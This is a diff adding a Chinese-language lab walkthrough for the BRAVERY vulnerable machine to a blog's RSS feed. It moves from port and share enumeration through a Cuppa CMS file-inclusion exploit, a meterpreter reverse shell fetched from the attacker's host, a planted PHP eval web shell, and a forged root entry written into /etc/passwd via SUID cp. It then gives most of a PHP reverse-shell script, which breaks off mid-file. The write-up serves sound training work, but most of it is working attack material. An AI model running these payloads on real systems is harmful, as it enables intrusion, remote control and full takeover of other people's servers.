@@ -4,9 +4,554 @@
         <title></title>
         <link>undefined</link>
         <description>undefined</description>
-        <lastBuildDate>Fri, 21 Oct 2022 09:22:32 GMT</lastBuildDate>
+        <lastBuildDate>Wed, 26 Oct 2022 10:30:25 GMT</lastBuildDate>
         <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
         <generator>Joplin Pages Publisher</generator>
+        <item>
+            <title><![CDATA[vulhub    DIGITALWORLD.LOCAL: BRAVERY]]></title>
+            <guid>51671c3f6b824ed59e3b07ac6d5f7558</guid>
+            <pubDate>Sat, 22 Oct 2022 02:54:08 GMT</pubDate>
+            <content:encoded><![CDATA[<p><strong>探测靶机ip及端口开放情况</strong></p>
+<div><pre class="hljs"><code>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.15
+Host is up (0.00020s latency).
+Not shown: 990 closed tcp ports (reset)
+PORT     STATE SERVICE
+22/tcp   open  ssh
+53/tcp   open  domain
+80/tcp   open  http
+111/tcp  open  rpcbind
+139/tcp  open  netbios-ssn
+443/tcp  open  https
+445/tcp  open  microsoft-ds
+2049/tcp open  nfs
+3306/tcp open  mysql
+8080/tcp open  http-proxy
+MAC Address: 08:00:27:B6:AC:46 (Oracle VirtualBox virtual NIC)</code></pre></div>
+<p>访问8080,扫描目录如下</p>
+<div><pre class="hljs"><code>└─<span class="hljs-comment"># python dirsearch.py -u http://192.168.56.15:8080/</span>
+
+  _|. _ _  _  _  _ _|_    v0.4.2.6
+ (_||| _) (/_(_|| (_| )
+
+Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11342
+
+Output File: /root/dirsearch/reports/192.168.56.15_8080/__22-10-26_15-42-50.txt
+
+Target: http://192.168.56.15:8080/
+
+[15:42:50] Starting: 
+[15:42:56] 200 -    4KB - /404.html                                         
+[15:42:57] 200 -  503B  - /about                                            
+[15:43:18] 200 -    3KB - /index.html                                       
+[15:43:30] 301 -  185B  - /private  -&gt;  http://192.168.56.15:8080/private/  
+[15:43:31] 301 -  185B  - /public  -&gt;  http://192.168.56.15:8080/public/    
+[15:43:31] 200 -   22KB - /public/                                          
+[15:43:32] 200 -  103B  - /robots.txt</code></pre></div>
+<div><pre class="hljs"><code>└─<span class="hljs-comment"># python dirsearch.py -u http://192.168.56.15:8080/public</span>
+
+  _|. _ _  _  _  _ _|_    v0.4.2.6
+ (_||| _) (/_(_|| (_| )
+
+Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11342
+
+Output File: /root/dirsearch/reports/192.168.56.15_8080/_public_22-10-26_15-44-17.txt
+
+Target: http://192.168.56.15:8080/public/
+
+[15:44:17] Starting: 
+[15:44:18] 301 -  185B  - /public/js  -&gt;  http://192.168.56.15:8080/public/js/
+[15:44:19] 200 -   14KB - /public/.DS_Store                                 
+[15:44:38] 301 -  185B  - /public/css  -&gt;  http://192.168.56.15:8080/public/css/
+[15:44:42] 301 -  185B  - /public/fonts  -&gt;  http://192.168.56.15:8080/public/fonts/
+[15:44:45] 301 -  185B  - /public/img  -&gt;  http://192.168.56.15:8080/public/img/
+[15:44:45] 200 -   22KB - /public/index.html                                
+[15:44:47] 403 -  571B  - /public/js/                                       
+[15:44:50] 200 -  766B  - /public/mail.php</code></pre></div>
+<p>访问各个web目录,如下</p>
+<p><img src="/_resources/dbfdd8360a7f456daf0a7f73398a1dfe.png" alt="9287f5ad2764d3e4972692cb1ec023de.png" width="885" height="528" class="jop-noMdConv" /> <img src="/_resources/49a73b58d1a6452c9b35e396ca460e85.png" alt="53e64311e9988394fe99f638c42aef1c.png" width="867" height="395" class="jop-noMdConv" /><img src="/_resources/0f1e377f7d014357b36712813edcc7c0.png" alt="bb7d7fb95ebc0adc10689b4abed38a25.png" width="797" height="439" class="jop-noMdConv" /></p>
+<p>没有发现有价值的信息</p>
+<hr />
+<p>发现开放了445端口，尝试访问得到如下</p>
+<p>发现anonymous 可以访问，secured无法访问</p>
+<div><pre class="hljs"><code>└─<span class="hljs-comment"># smbmap  -H 192.168.56.15</span>
+[+] Guest session       IP: 192.168.56.15:445   Name: 192.168.56.15                                     
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        anonymous                                               READ ONLY
+        secured                                                 NO ACCESS
+        IPC$                                                    NO ACCESS       IPC Service (Samba Server 4.7.1)</code></pre></div>
+<p>继续访问anonymous 文件夹下数据，得到</p>
+<div><pre class="hljs"><code>└─<span class="hljs-comment"># smbclient //192.168.56.15/anonymous</span>
+Password <span class="hljs-keyword">for</span> [WORKGROUP\root]:
+Try <span class="hljs-string">"help"</span> to get a list of possible commands.
+smb: \&gt; dir
+  .                                   D        0  Fri Sep 28 21:01:35 2018
+  ..                                  D        0  Fri Jun 15 00:30:39 2018
+  patrick<span class="hljs-string">'s folder                    D        0  Fri Sep 28 20:38:27 2018
+  qiu'</span>s folder                        D        0  Fri Sep 28 21:27:20 2018
+  genevieve<span class="hljs-string">'s folder                  D        0  Fri Sep 28 21:08:31 2018
+  david'</span>s folder                      D        0  Wed Dec 26 10:19:51 2018
+  kenny<span class="hljs-string">'s folder                      D        0  Fri Sep 28 20:52:49 2018
+  qinyi'</span>s folder                      D        0  Fri Sep 28 20:45:22 2018
+  sara<span class="hljs-string">'s folder                       D        0  Fri Sep 28 21:34:23 2018
+  readme.txt                          N      489  Fri Sep 28 21:54:03 2018
+
+                17811456 blocks of size 1024. 13171116 blocks available
+smb: \&gt;</span></code></pre></div>
+<p>查看该目录下的内容，木有什么有价值的</p>
+<hr />
+<p>还发现了nfs服务，查看发现存在nfs目录，将其挂载到本地</p>
+<div><pre class="hljs"><code>┌──(root㉿kali)-[~/dirsearch]
+└─<span class="hljs-comment"># showmount -e 192.168.56.15                            </span>
+Export list <span class="hljs-keyword">for</span> 192.168.56.15:
+/var/nfsshare *
+                                                                                                                           
+┌──(root㉿kali)-[~/dirsearch]
+└─<span class="hljs-comment"># mount -t nfs 192.168.56.15:/var/nfsshare  /mnt/bravery</span>
+                                                                                                                           
+┌──(root㉿kali)-[~/dirsearch]
+└─<span class="hljs-comment"># cd /mnt/bravery </span>
+                                                                                                                           
+┌──(root㉿kali)-[/mnt/bravery]
+└─<span class="hljs-comment"># ls</span>
+discovery  enumeration  explore  itinerary  password.txt  qwertyuioplkjhgfdsazxcvbnm  README.txt</code></pre></div>
+<p>查看nfs目录下的文件</p>
+<div><pre class="hljs"><code>┌──(root㉿kali)-[/mnt/bravery]
+└─<span class="hljs-comment"># ls              </span>
+discovery  enumeration  explore  itinerary  password.txt  qwertyuioplkjhgfdsazxcvbnm  README.txt
+                                                                                                                           
+┌──(root㉿kali)-[/mnt/bravery]
+└─<span class="hljs-comment"># cat password.txt</span>
+Passwords should not be stored <span class="hljs-keyword">in</span> clear-text, written <span class="hljs-keyword">in</span> post-its or written on files on the hard disk!
+                                                                                                                           
+┌──(root㉿kali)-[/mnt/bravery]
+└─<span class="hljs-comment"># cat README.txt  </span>
+<span class="hljs-built_in">read</span> me first!</code></pre></div>
+<p><code>qwertyuioplkjhgfdsazxcvbnm</code>应当是一个密码</p>
+<p>想到之前samba共享的secured目录需要登录，尝试使用刚获取的密码</p>
+<p>账户猜测是anonymous 文件夹下的 xxx’s folder的名字，成功登录secured目录</p>
+<div><pre class="hljs"><code>└─<span class="hljs-comment"># smbclient -U david //192.168.56.15/secured</span>
+Password <span class="hljs-keyword">for</span> [WORKGROUP\david]:
+Try <span class="hljs-string">"help"</span> to get a list of possible commands.
+smb: \&gt; dir
+  .                                   D        0  Fri Sep 28 21:52:14 2018
+  ..                                  D        0  Fri Jun 15 00:30:39 2018
+  david.txt                           N      376  Sat Jun 16 16:36:07 2018
+  genevieve.txt                       N      398  Tue Jul 24 00:51:27 2018
+  README.txt                          N      323  Tue Jul 24 09:58:53 2018
+
+                17811456 blocks of size 1024. 13181944 blocks available
+smb: \&gt; get david.txt
+getting file \david.txt of size 376 as david.txt (8.0 KiloBytes/sec) (average 8.0 KiloBytes/sec)
+smb: \&gt; get genevieve.txt 
+getting file \genevieve.txt of size 398 as genevieve.txt (9.0 KiloBytes/sec) (average 8.5 KiloBytes/sec)
+smb: \&gt; get README.txt 
+getting file \README.txt of size 323 as README.txt (21.0 KiloBytes/sec) (average 10.3 KiloBytes/sec)</code></pre></div>
+<p>查看三个文件的信息</p>
+<div><pre class="hljs"><code>└─<span class="hljs-comment"># cat david.txt </span>
+I have concerns over how the developers are designing their webpage. The use of <span class="hljs-string">"developmentsecretpage"</span> is too long and unwieldy. We should cut short the addresses <span class="hljs-keyword">in</span> our <span class="hljs-built_in">local</span> domain.
+
+1. Reminder to tell Patrick to replace <span class="hljs-string">"developmentsecretpage"</span> with <span class="hljs-string">"devops"</span>.
+
+2. Request the intern to adjust her Favourites to http://&lt;developmentIPandport&gt;/devops/directortestpagev1.php.
+                                                                                                                           
+┌──(root㉿kali)-[~]
+└─<span class="hljs-comment"># cat genevieve.txt </span>
+Hi! This is Genevieve!
+
+We are still trying to construct our department<span class="hljs-string">'s IT infrastructure; it'</span>s been proving painful so far.
+
+If you wouldn<span class="hljs-string">'t mind, please do not subject my site (http://192.168.254.155/genevieve) to any load-test as of yet. We'</span>re trying to establish quite a few things:
+
+a) File-share to our director.
+b) Setting up our CMS.
+c) Requesting <span class="hljs-keyword">for</span> a HIDS solution to secure our host.
+                                                                                                                           
+┌──(root㉿kali)-[~]
+└─<span class="hljs-comment"># cat README.txt </span>
+README FOR THE USE OF THE BRAVERY MACHINE:
+
+Your use of the BRAVERY machine is subject to the following conditions:
+
+1. You are a permanent staff <span class="hljs-keyword">in</span> Good Tech Inc.
+2. Your rank is HEAD and above.
+3. You have obtained your BRAVERY badges.
+
+For more enquiries, please <span class="hljs-built_in">log</span> into the CMS using the correct magic word: goodtech.</code></pre></div>
+<p>访问http://192.168.56.15/devops/directortestpagev1.php</p>
+<img src="/_resources/5b48a2241eac4a26a15f140e6334681a.png" alt="54a44f54c9ff21fd31d3746ac89840cb.png" width="992" height="212" class="jop-noMdConv" />
+<p>访问http://192.168.254.155/genevieve --&gt;  <a title="http://192.168.56.15/genevieve" href="http://192.168.56.15/genevieve">http://192.168.56.15/genevieve</a></p>
+<img src="/_resources/e13d738f90d94dffb9aecd0fa3d57c3c.png" alt="6850429da6ab493a6643ded72e2e568a.png" width="971" height="655" class="jop-noMdConv" />
+<p>继续访问该站点，发现该站点为cuppaCMS</p>
+<img src="/_resources/b9e35dcee43342559da22b647ed55277.png" alt="9d345ebc9c20af949ef665a458c90767.png" width="934" height="439" class="jop-noMdConv" />
+<hr />
+<p>搜索cuppaCMS相关的漏洞</p>
+<div><pre class="hljs"><code>└─<span class="hljs-comment"># searchsploit cuppa   </span>
+--------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                 |  Path
+--------------------------------------------------------------- ---------------------------------
+Cuppa CMS - <span class="hljs-string">'/alertConfigField.php'</span> Local/Remote File Inclusio | php/webapps/25971.txt
+--------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results</code></pre></div>
+<p>查看漏洞详情并尝试利用</p>
+<div><pre class="hljs"><code>└─<span class="hljs-comment"># searchsploit -p 25971.txt</span>
+  Exploit: Cuppa CMS - <span class="hljs-string">'/alertConfigField.php'</span> Local/Remote File Inclusion
+      URL: https://www.exploit-db.com/exploits/25971
+     Path: /usr/share/exploitdb/exploits/php/webapps/25971.txt
+File Type: C++ <span class="hljs-built_in">source</span>, ASCII text, with very long lines (876)</code></pre></div>
+<div><pre class="hljs"><code>└─<span class="hljs-comment"># cat /usr/share/exploitdb/exploits/php/webapps/25971.txt</span>
+<span class="hljs-comment"># Exploit Title   : Cuppa CMS File Inclusion</span>
+<span class="hljs-comment"># Date            : 4 June 2013</span>
+<span class="hljs-comment"># Exploit Author  : CWH Underground</span>
+<span class="hljs-comment"># Site            : www.2600.in.th</span>
+<span class="hljs-comment"># Vendor Homepage : http://www.cuppacms.com/</span>
+<span class="hljs-comment"># Software Link   : http://jaist.dl.sourceforge.net/project/cuppacms/cuppa_cms.zip</span>
+<span class="hljs-comment"># Version         : Beta</span>
+<span class="hljs-comment"># Tested on       : Window and Linux</span>
+
+  ,--^----------,--------,-----,-------^--,
+  | |||||||||   `--------<span class="hljs-string">'     |          O .. CWH Underground Hacking Team ..
+  `+---------------------------^----------|
+    `\_,-------, _________________________|
+      / XXXXXX /`|     /
+     / XXXXXX /  `\   /
+    / XXXXXX /\______(
+   / XXXXXX /
+  / XXXXXX /
+ (________(
+  `------'</span>
+
+<span class="hljs-comment">####################################</span>
+VULNERABILITY: PHP CODE INJECTION
+<span class="hljs-comment">####################################</span>
+
+/alerts/alertConfigField.php (LINE: 22)
+
+-----------------------------------------------------------------------------
+LINE 22:
+        &lt;?php include(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">"urlConfig"</span>]); ?&gt;
+-----------------------------------------------------------------------------
+
+
+<span class="hljs-comment">#####################################################</span>
+DESCRIPTION
+<span class="hljs-comment">#####################################################</span>
+
+An attacker might include <span class="hljs-built_in">local</span> or remote PHP files or <span class="hljs-built_in">read</span> non-PHP files with this vulnerability. User tainted data is used when creating the file name that will be included into the current file. PHP code <span class="hljs-keyword">in</span> this file will be evaluated, non-PHP code will be embedded to the output. This vulnerability can lead to full server compromise.
+
+http://target/cuppa/alerts/alertConfigField.php?urlConfig=[FI]
+
+<span class="hljs-comment">#####################################################</span>
+EXPLOIT
+<span class="hljs-comment">#####################################################</span>
+
+http://target/cuppa/alerts/alertConfigField.php?urlConfig=http://www.shell.com/shell.txt?
+http://target/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
+
+Moreover, We could access Configuration.php <span class="hljs-built_in">source</span> code via PHPStream
+
+For Example:
+-----------------------------------------------------------------------------
+http://target/cuppa/alerts/alertConfigField.php?urlConfig=php://filter/convert.base64-encode/resource=../Configuration.php
+-----------------------------------------------------------------------------
+
+Base64 Encode Output:
+-----------------------------------------------------------------------------
+PD9waHAgCgljbGFzcyBDb25maWd1cmF0aW9uewoJCXB1YmxpYyAkaG9zdCA9ICJsb2NhbGhvc3QiOwoJCXB1YmxpYyAkZGIgPSAiY3VwcGEiOwoJCXB1YmxpYyAkdXNlciA9ICJyb290IjsKCQlwdWJsaWMgJHBhc3N3b3JkID0gIkRiQGRtaW4iOwoJCXB1YmxpYyAkdGFibGVfcHJlZml4ID0gImN1XyI7CgkJcHVibGljICRhZG1pbmlzdHJhdG9yX3RlbXBsYXRlID0gImRlZmF1bHQiOwoJCXB1YmxpYyAkbGlzdF9saW1pdCA9IDI1OwoJCXB1YmxpYyAkdG9rZW4gPSAiT0JxSVBxbEZXZjNYIjsKCQlwdWJsaWMgJGFsbG93ZWRfZXh0ZW5zaW9ucyA9ICIqLmJtcDsgKi5jc3Y7ICouZG9jOyAqLmdpZjsgKi5pY287ICouanBnOyAqLmpwZWc7ICoub2RnOyAqLm9kcDsgKi5vZHM7ICoub2R0OyAqLnBkZjsgKi5wbmc7ICoucHB0OyAqLnN3ZjsgKi50eHQ7ICoueGNmOyAqLnhsczsgKi5kb2N4OyAqLnhsc3giOwoJCXB1YmxpYyAkdXBsb2FkX2RlZmF1bHRfcGF0aCA9ICJtZWRpYS91cGxvYWRzRmlsZXMiOwoJCXB1YmxpYyAkbWF4aW11bV9maWxlX3NpemUgPSAiNTI0Mjg4MCI7CgkJcHVibGljICRzZWN1cmVfbG9naW4gPSAwOwoJCXB1YmxpYyAkc2VjdXJlX2xvZ2luX3ZhbHVlID0gIiI7CgkJcHVibGljICRzZWN1cmVfbG9naW5fcmVkaXJlY3QgPSAiIjsKCX0gCj8+
+-----------------------------------------------------------------------------
+
+Base64 Decode Output:
+-----------------------------------------------------------------------------
+&lt;?php
+        class Configuration{
+                public <span class="hljs-variable">$host</span> = <span class="hljs-string">"localhost"</span>;
+                public <span class="hljs-variable">$db</span> = <span class="hljs-string">"cuppa"</span>;
+                public <span class="hljs-variable">$user</span> = <span class="hljs-string">"root"</span>;
+                public <span class="hljs-variable">$password</span> = <span class="hljs-string">"Db@dmin"</span>;
+                public <span class="hljs-variable">$table_prefix</span> = <span class="hljs-string">"cu_"</span>;
+                public <span class="hljs-variable">$administrator_template</span> = <span class="hljs-string">"default"</span>;
+                public <span class="hljs-variable">$list_limit</span> = 25;
+                public <span class="hljs-variable">$token</span> = <span class="hljs-string">"OBqIPqlFWf3X"</span>;
+                public <span class="hljs-variable">$allowed_extensions</span> = <span class="hljs-string">"*.bmp; *.csv; *.doc; *.gif; *.ico; *.jpg; *.jpeg; *.odg; *.odp; *.ods; *.odt; *.pdf; *.png; *.ppt; *.swf; *.txt; *.xcf; *.xls; *.docx; *.xlsx"</span>;
+                public <span class="hljs-variable">$upload_default_path</span> = <span class="hljs-string">"media/uploadsFiles"</span>;
+                public <span class="hljs-variable">$maximum_file_size</span> = <span class="hljs-string">"5242880"</span>;
+                public <span class="hljs-variable">$secure_login</span> = 0;
+                public <span class="hljs-variable">$secure_login_value</span> = <span class="hljs-string">""</span>;
+                public <span class="hljs-variable">$secure_login_redirect</span> = <span class="hljs-string">""</span>;
+        }
+?&gt;
+-----------------------------------------------------------------------------
+
+Able to <span class="hljs-built_in">read</span> sensitive information via File Inclusion (PHP Stream)
+
+<span class="hljs-comment">################################################################################################################</span>
+ Greetz      : ZeQ3uL, JabAv0C, p3lo, Sh0ck, BAD <span class="hljs-variable">$ectors</span>, Snapter, Conan, Win7dos, Gdiupo, GnuKDE, JK, Retool2
+<span class="hljs-comment">################################################################################################################</span></code></pre></div>
+<p>该exp有两个漏洞点，一个本地文件包含读文件，一个远程文件包含</p>
+<p>那我们开启kali http服务，并制作一个反弹shell木马，让靶机对其进行包含</p>
+<p>msfvenom生成一个php木马</p>
+<div><pre class="hljs"><code>msfvenom -p php/meterpreter_reverse_tcp lhost=192.168.56.123 lport=4444 -f raw &gt; shell.php</code></pre></div>
+<p>接下来开启4444端口监听并对该php木马进行文件包含并开启</p>
+<p><code>http://192.168.56.15/genevieve/cuppaCMS/alerts/alertConfigField.php?urlConfig=http://192.168.56.123/shell.php</code></p>
+<p>成功获取到shell</p>
+<img src="/_resources/9d637bee723949ba95880d4340cb8d12.png" alt="86335f5a32486fdcb09cb011adeb5253.png" width="933" height="510" class="jop-noMdConv" />
+<p>接下来尝试提权，该主机为linux，那么尝试进习惯SUID提权</p>
+<p><code>find / -perm -u=s -type f 2&gt;/dev/null</code></p>
+<div><pre class="hljs"><code>find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null
+/usr/bin/cp
+/usr/bin/chfn
+/usr/bin/chsh
+/usr/bin/fusermount
+/usr/bin/chage
+/usr/bin/gpasswd
+/usr/bin/newgrp
+/usr/bin/sudo
+/usr/bin/mount
+/usr/bin/su
+/usr/bin/umount
+/usr/bin/Xorg
+/usr/bin/pkexec
+/usr/bin/crontab
+/usr/bin/passwd
+/usr/bin/ksu
+/usr/bin/at
+/usr/bin/staprun
+/usr/sbin/pam_timestamp_check
+/usr/sbin/unix_chkpwd
+/usr/sbin/usernetctl
+/usr/sbin/userhelper
+/usr/sbin/mount.nfs
+/usr/lib/polkit-1/polkit-agent-helper-1
+/usr/libexec/dbus-1/dbus-daemon-launch-helper
+/usr/libexec/flatpak-bwrap
+/usr/libexec/sssd/krb5_child
+/usr/libexec/sssd/ldap_child
+/usr/libexec/sssd/selinux_child
+/usr/libexec/sssd/proxy_child
+/usr/libexec/qemu-bridge-helper
+/usr/libexec/spice-gtk-x86_64/spice-client-glib-usb-acl-helper
+/usr/libexec/abrt-action-install-debuginfo-to-abrt-cache
+sh-4.2$</code></pre></div>
+<p>发现cp命令可以root身份免密码使用</p>
+<p>考虑自己制作一个root用户并添加至/etc/passwd文件中</p>
+<p>先读取/etc/passwd文件</p>
+<div><pre class="hljs"><code>root:x:0:0:root:/root:/bin/bash
+bin:x:1:1:bin:/bin:/sbin/nologin
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+adm:x:3:4:adm:/var/adm:/sbin/nologin
+lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+sync:x:5:0:sync:/sbin:/bin/sync
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+halt:x:7:0:halt:/sbin:/sbin/halt
+mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
+operator:x:11:0:operator:/root:/sbin/nologin
+games:x:12:100:games:/usr/games:/sbin/nologin
+ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
+nobody:x:99:99:Nobody:/:/sbin/nologin
+systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
+dbus:x:81:81:System message bus:/:/sbin/nologin
+polkitd:x:999:998:User <span class="hljs-keyword">for</span> polkitd:/:/sbin/nologin
+sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
+postfix:x:89:89::/var/spool/postfix:/sbin/nologin
+chrony:x:998:996::/var/lib/chrony:/sbin/nologin
+david:x:1000:1000:david:/home/david:/bin/bash
+apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
+tss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin
+geoclue:x:997:995:User <span class="hljs-keyword">for</span> geoclue:/var/lib/geoclue:/sbin/nologin
+mysql:x:27:27:MariaDB Server:/var/lib/mysql:/sbin/nologin
+nginx:x:996:994:Nginx web server:/var/lib/nginx:/sbin/nologin
+rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin
+libstoragemgmt:x:995:991:daemon account <span class="hljs-keyword">for</span> libstoragemgmt:/var/run/lsm:/sbin/nologin
+gluster:x:994:990:GlusterFS daemons:/var/run/gluster:/sbin/nologin
+unbound:x:993:989:Unbound DNS resolver:/etc/unbound:/sbin/nologin
+qemu:x:107:107:qemu user:/:/sbin/nologin
+usbmuxd:x:113:113:usbmuxd user:/:/sbin/nologin
+rtkit:x:172:172:RealtimeKit:/proc:/sbin/nologin
+colord:x:992:988:User <span class="hljs-keyword">for</span> colord:/var/lib/colord:/sbin/nologin
+ntp:x:38:38::/etc/ntp:/sbin/nologin
+abrt:x:173:173::/etc/abrt:/sbin/nologin
+saslauth:x:991:76:Saslauthd user:/run/saslauthd:/sbin/nologin
+pulse:x:171:171:PulseAudio System Daemon:/var/run/pulse:/sbin/nologin
+sssd:x:990:984:User <span class="hljs-keyword">for</span> sssd:/:/sbin/nologin
+rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
+nfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin
+radvd:x:75:75:radvd user:/:/sbin/nologin
+gdm:x:42:42::/var/lib/gdm:/sbin/nologin
+setroubleshoot:x:989:983::/var/lib/setroubleshoot:/sbin/nologin
+gnome-initial-setup:x:988:982::/run/gnome-initial-setup/:/sbin/nologin
+tcpdump:x:72:72::/:/sbin/nologin
+avahi:x:70:70:Avahi mDNS/DNS-SD Stack:/var/run/avahi-daemon:/sbin/nologin
+ossec:x:1001:1002::/var/ossec:/sbin/nologin
+ossecm:x:1002:1002::/var/ossec:/sbin/nologin
+ossecr:x:1003:1002::/var/ossec:/sbin/nologin
+rick:x:1004:1004::/home/rick:/bin/bash</code></pre></div>
+<p>我们在/var/www/html目录下做一个一句话木马然后使用蚁剑连接</p>
+<div><pre class="hljs"><code>sh-4.2$ <span class="hljs-built_in">pwd</span>        
+/var/www/html
+<span class="hljs-built_in">pwd</span>
+sh-4.2$ <span class="hljs-built_in">echo</span> <span class="hljs-string">'&lt;?php @eval($_POST[cmd]);?&gt;'</span> &gt; ./hack.php
+<span class="hljs-built_in">echo</span> <span class="hljs-string">'&lt;?php @eval($_POST[cmd]);?&gt;'</span> &gt; ./hack.php
+sh-4.2$ cat hack.php
+cat hack.php
+&lt;?php @<span class="hljs-built_in">eval</span>(<span class="hljs-variable">$_POST</span>[cmd]);?&gt;</code></pre></div>
+<img src="/_resources/6b188f260f524de8a6003e0fd8b7091a.png" alt="610f6f7b3b2ed6e0fbb95a07bb789f29.png" width="1062" height="281" class="jop-noMdConv" />
+<p>制作一个passwd文件，其中内容为靶机的passwd文件，并将做好的root身份用户添加至passwd文件末尾，上传至靶机然后cp替代靶机的/etc/passwd文件</p>
+<p>制作的用户为<code>sob:$1$sob$BmJLmGFTRiB9Pzlip0Dpa0:0:0::/root:/bin/bash</code></p>
+<img src="/_resources/f54ed671330340fc8214d0b8fae10ce0.png" alt="8c894480caeb99dac32a2f501f433ad5.png" width="972" height="349" class="jop-noMdConv" />
+<p>最后成功提权</p>
+<img src="/_resources/9a4bbec05bc0427a8e3aeb5f729c0618.png" alt="23a904f907c03a6807414c6d5d2c4455.png" width="962" height="768" class="jop-noMdConv" />
+<img src="/_resources/6f9a6a034663463d9bbc36a119353741.png" alt="8b4e596af7da646be8fb1456be2c657e.png" width="840" height="584" class="jop-noMdConv" />
+<hr />
+<p>PS:这里贴一下用到的php反弹shell</p>
+<div><pre class="hljs"><code><span class="hljs-meta">&lt;?php</span>
+
+<span class="hljs-comment">// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.</span>
+
+set_time_limit (<span class="hljs-number">0</span>);
+<span class="hljs-variable">$VERSION</span> = <span class="hljs-string">"1.0"</span>;
+<span class="hljs-variable">$ip</span> = <span class="hljs-string">'192.168.56.123'</span>;  <span class="hljs-comment">// CHANGE THIS</span>
+<span class="hljs-variable">$port</span> = <span class="hljs-number">4444</span>;       <span class="hljs-comment">// CHANGE THIS</span>
+<span class="hljs-variable">$chunk_size</span> = <span class="hljs-number">1400</span>;
+<span class="hljs-variable">$write_a</span> = <span class="hljs-literal">null</span>;
+<span class="hljs-variable">$error_a</span> = <span class="hljs-literal">null</span>;
+<span class="hljs-variable">$shell</span> = <span class="hljs-string">'uname -a; w; id; /bin/sh -i'</span>;
+<span class="hljs-variable">$daemon</span> = <span class="hljs-number">0</span>;
+<span class="hljs-variable">$debug</span> = <span class="hljs-number">0</span>;
+
+<span class="hljs-comment">//</span>
+<span class="hljs-comment">// Daemonise ourself if possible to avoid zombies later</span>
+<span class="hljs-comment">//</span>
+
+<span class="hljs-comment">// pcntl_fork is hardly ever available, but will allow us to daemonise</span>
+<span class="hljs-comment">// our php process and avoid zombies.  Worth a try...</span>
+<span class="hljs-keyword">if</span> (function_exists(<span class="hljs-string">'pcntl_fork'</span>)) {
+    <span class="hljs-comment">// Fork and have the parent process exit</span>
+    <span class="hljs-variable">$pid</span> = pcntl_fork();
+    
+    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$pid</span> == -<span class="hljs-number">1</span>) {
+        printit(<span class="hljs-string">"ERROR: Can't fork"</span>);
+        <span class="hljs-keyword">exit</span>(<span class="hljs-number">1</span>);
+    }
+    
+    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$pid</span>) {
+        <span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);  <span class="hljs-comment">// Parent exits</span>
+    }
+
+    <span class="hljs-comment">// Make the current process a session leader</span>
+    <span class="hljs-comment">// Will only succeed if we forked</span>
+    <span class="hljs-keyword">if</span> (posix_setsid() == -<span class="hljs-number">1</span>) {
+        printit(<span class="hljs-string">"Error: Can't setsid()"</span>);
+        <span class="hljs-keyword">exit</span>(<span class="hljs-number">1</span>);
+    }
+
+    <span class="hljs-variable">$daemon</span> = <span class="hljs-number">1</span>;
+} <span class="hljs-keyword">else</span> {
+    printit(<span class="hljs-string">"WARNING: Failed to daemonise.  This is quite common and not fatal."</span>);
+}
+
+<span class="hljs-comment">// Change to a safe directory</span>
+chdir(<span class="hljs-string">"/"</span>);
+
+<span class="hljs-comment">// Remove any umask we inherited</span>
+umask(<span class="hljs-number">0</span>);
+
+<span class="hljs-comment">//</span>
+<span class="hljs-comment">// Do the reverse shell...</span>
+<span class="hljs-comment">//</span>
+
+<span class="hljs-comment">// Open reverse connection</span>
+<span class="hljs-variable">$sock</span> = fsockopen(<span class="hljs-variable">$ip</span>, <span class="hljs-variable">$port</span>, <span class="hljs-variable">$errno</span>, <span class="hljs-variable">$errstr</span>, <span class="hljs-number">30</span>);
+<span class="hljs-keyword">if</span> (!<span class="hljs-variable">$sock</span>) {
+    printit(<span class="hljs-string">"<span class="hljs-subst">$errstr</span> (<span class="hljs-subst">$errno</span>)"</span>);
+    <span class="hljs-keyword">exit</span>(<span class="hljs-number">1</span>);
+}
+
+<span class="hljs-comment">// Spawn shell process</span>
+<span class="hljs-variable">$descriptorspec</span> = <span class="hljs-keyword">array</span>(
+   <span class="hljs-number">0</span> =&gt; <span class="hljs-keyword">array</span>(<span class="hljs-string">"pipe"</span>, <span class="hljs-string">"r"</span>),  <span class="hljs-comment">// stdin is a pipe that the child will read from</span>
+   <span class="hljs-number">1</span> =&gt; <span class="hljs-keyword">array</span>(<span class="hljs-string">"pipe"</span>, <span class="hljs-string">"w"</span>),  <span class="hljs-comment">// stdout is a pipe that the child will write to</span>
+   <span class="hljs-number">2</span> =&gt; <span class="hljs-keyword">array</span>(<span class="hljs-string">"pipe"</span>, <span class="hljs-string">"w"</span>)   <span class="hljs-comment">// stderr is a pipe that the child will write to</span>
+);
+
+<span class="hljs-variable">$process</span> = proc_open(<span class="hljs-variable">$shell</span>, <span class="hljs-variable">$descriptorspec</span>, <span class="hljs-variable">$pipes</span>);
+
+<span class="hljs-keyword">if</span> (!is_resource(<span class="hljs-variable">$process</span>)) {
+    printit(<span class="hljs-string">"ERROR: Can't spawn shell"</span>);
+    <span class="hljs-keyword">exit</span>(<span class="hljs-number">1</span>);
+}
+
+<span class="hljs-comment">// Set everything to non-blocking</span>
+<span class="hljs-comment">// Reason: Occsionally reads will block, even though stream_select tells us they won't</span>
